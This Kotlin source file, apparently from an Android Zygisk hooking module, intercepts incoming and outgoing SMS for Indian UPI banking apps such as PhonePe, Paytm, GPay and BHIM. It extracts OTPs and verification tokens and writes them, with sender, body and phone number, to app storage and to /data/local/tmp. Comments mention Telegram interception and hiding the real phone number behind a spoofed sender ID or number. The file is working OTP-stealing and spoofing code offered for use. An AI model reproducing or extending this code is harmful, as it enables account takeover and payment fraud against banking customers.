package com.hivirtus.zygiskmode

import android.content.Context
import org.json.JSONObject
import java.util.regex.Pattern

object SmsMatcher {

    private val OTP_PATTERN = Pattern.compile("""\b(\d{4,8})\b""")
    private val SENDER_ID_PATTERN = Pattern.compile(
        """^(AD|VM|JD|BP|TX|VK|AX|IC|PY|BZ|JM)-[A-Z0-9]+(-S)?$""",
        Pattern.CASE_INSENSITIVE
    )
    private val DEFAULT_SENDER = "AD-TEST-S"
    private val SENDER_PREFIXES = listOf("AD-", "VM-", "JD-", "BP-", "TX-", "JM-", "VK-", "AX-")

    fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
        UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }

    /** MESSAGE tab Sender ID — AD-YESBNK-S, JM-UNTYBK-S, etc. */
    fun savedSenderId(config: ModuleConfig): String? {
        val id = config.injectSenderId.trim().uppercase()
        if (id.isBlank() || id == DEFAULT_SENDER) return null
        return id
    }

    fun shouldCaptureIncoming(config: ModuleConfig, sender: String, body: String): Boolean {
        if (!config.hookIncomingSms && !config.hookUpiVerification) return false
        return shouldCaptureForHookedApps(config, sender, body)
    }

    fun shouldCaptureOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
        if (!config.hookOutgoingSms) return false
        return shouldCaptureForHookedApps(config, recipient, body)
    }

    private fun shouldCaptureForHookedApps(config: ModuleConfig, peer: String, body: String): Boolean {
        if (body.isBlank() || peer.isBlank()) return false
        val hooked = enabledHookedApps(config)
        if (hooked.isEmpty()) return false

        // 1) Hooked UPI app keyword match (sender ya body)
        if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true

        // 2) Sender ID set — koi bhi SMS intercept (dusre phone se bhi), display = Sender ID
        val savedId = savedSenderId(config)
        if (savedId != null) return true

        // 3) Verification OTP + hooked app body keyword
        if (isVerificationBody(body) && UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true

        return false
    }

    /**
     * Telegram / intercept — kabhi real phone number mat dikhao.
     * Pehle saved Sender ID, phir carrier sender ID, phir spoof number.
     */
    fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
        savedSenderId(config)?.let { return it }
        if (isAlphanumericSenderId(actualPeer)) return normalizeSender(actualPeer)
        val spoof = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
        return spoof.ifBlank { "INTERCEPT" }
    }

    fun displaySenderId(config: ModuleConfig, actualSender: String): String {
        savedSenderId(config)?.let { return it }
        if (isAlphanumericSenderId(actualSender)) return normalizeSender(actualSender)
        return DEFAULT_SENDER
    }

    fun senderMatches(actual: String, filter: String): Boolean {
        val a = normalizeSender(actual)
        val f = normalizeSender(filter)
        if (a.isBlank() || f.isBlank()) return false
        if (a == f) return true
        val aCompact = a.replace("-", "")
        val fCompact = f.replace("-", "")
        return aCompact == fCompact || a.contains(f) || f.contains(a) || aCompact.contains(fCompact)
    }

    fun normalizeSender(sender: String): String =
        sender.replace("\\s".toRegex(), "").uppercase()

    fun isAlphanumericSenderId(sender: String): Boolean {
        val s = normalizeSender(sender)
        if (SENDER_ID_PATTERN.matcher(s).matches()) return true
        if (SENDER_PREFIXES.any { s.startsWith(it) }) return true
        return s.any { it.isLetter() } && !isNumericSender(s)
    }

    fun isNumericSender(sender: String): Boolean {
        val digits = sender.replace("\\D".toRegex(), "")
        return digits.length >= 8 && !sender.any { it.isLetter() }
    }

    fun extractToken(body: String, autoExtract: Boolean): String {
        val trimmed = body.trim()
        if (trimmed.isEmpty()) return ""
        if (isEncryptedToken(trimmed)) return trimmed
        if (!autoExtract) return trimmed

        val matcher = OTP_PATTERN.matcher(trimmed)
        if (matcher.find()) {
            val digits = matcher.group(1) ?: trimmed
            if (digits.length < 6 && trimmed.length > 20) return trimmed
            return digits
        }
        return trimmed
    }

    fun isEncryptedToken(text: String): Boolean {
        if (text.length < 24) return false
        val compact = text.replace("\\s".toRegex(), "")
        if (compact.length < 20) return false
        val tokenChars = compact.count { it.isLetterOrDigit() || it in "+/=)(?&._-" }
        return tokenChars >= compact.length * 0.85
    }

    private fun isVerificationBody(body: String): Boolean {
        if (isEncryptedToken(body)) return true
        val upper = body.uppercase()
        val keywords = listOf(
            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO", "YESBNK",
            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "PASSWORD", "BANK", "UNTYBK"
        )
        return keywords.any { upper.contains(it) }
    }
}

object OtpCaptureWriter {

    fun write(context: Context, otp: LastOtp) {
        val json = JSONObject().apply {
            put("otp", otp.otp)
            put("sender", otp.sender)
            put("body", otp.body)
            put("direction", otp.direction)
            put("phone", otp.phone)
            put("message_label", otp.messageLabel)
            put("captured_at", System.currentTimeMillis())
        }
        val payload = json.toString()
        val appDir = context.getExternalFilesDir(null) ?: context.filesDir

        try {
            appDir.mkdirs()
            java.io.File(appDir, ConfigManager.APP_OTP_NAME).writeText(payload)
        } catch (_: Exception) {}

        try {
            java.io.File("/data/local/tmp/hivirtus_last_otp.json").writeText(payload)
        } catch (_: Exception) {}
    }
}
